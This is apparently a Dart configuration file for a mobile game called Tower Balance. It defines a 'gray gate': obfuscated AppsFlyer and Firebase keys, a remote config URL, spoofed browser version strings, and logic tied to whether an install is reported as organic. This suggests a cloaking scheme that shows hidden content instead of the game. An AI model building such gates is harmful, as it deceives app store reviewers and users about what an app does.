import 'dart:io';

import '../utils/byte_unmask.dart';
import 'gateway_endpoints.dart';

/// Per-brand constants that control the gray boot flow. Values that need to
/// stay private (AppsFlyer dev key, Firebase project number) live as
/// obfuscated byte arrays. Until the brand owner ships them the constants
/// resolve to empty strings — see [RuntimeBrand.gateEnabled].

// AppsFlyer dev key (shared between Android and iOS as provisioned by brand).
const List<int> _installKey = <int>[
  251, 159, 151, 39, 147, 95, 49, 67, 196, 59, 191, 89,
  100, 110, 187, 116, 221, 179, 188, 119, 210, 177,
];

// Firebase project number (twrblnc / TowerBalance).
const List<int> _firebaseProject = <int>[
  151, 233, 234, 89, 231, 41, 82, 26, 134, 114, 225, 3,
];

abstract final class RuntimeBrand {
  static const String packageName = 'krwl.twr.balance';
  static const String storeIdentifier = 'krwl.twr.balance';
  static const String displayTitle = 'Tower Balance';
  static const String iosAppId = '6768463410';

  // Three days, expressed in seconds. Used for push opt-in cool downs.
  static const int notifyCooldownSeconds = 60 * 60 * 24 * 3;

  // Delay before re-querying GCD when AppsFlyer reports an Organic install.
  static const int organicRefetchSeconds = 6;

  static String get installDevKey => unmask(_installKey);

  static String get firebaseProjectNumber => unmask(_firebaseProject);

  static String get configUrl => gateEndpoint();
  static String get chromeBuild => webChromeVersion();
  static String get safariBuild => webSafariVersion();
  static String get privacyUrl => brandPrivacyUrl;
  static String get supportUrl => brandSupportUrl;

  /// Platform-aware accessor for the install key — kept for parity with the
  /// TowerFalls API so the gray services can compile unchanged. Both
  /// platforms currently share a single AppsFlyer dev key.
  // ignore: unused_element
  static String get _installKeyPerPlatform =>
      Platform.isIOS ? installDevKey : installDevKey;

  /// `true` when at least one piece of the gray gate has been provisioned.
  /// Lets [main.dart] decide whether to even mount the gray entry gate or
  /// jump straight into the existing TowerBalance game flow.
  static bool get gateEnabled =>
      configUrl.isNotEmpty || installDevKey.isNotEmpty;
}
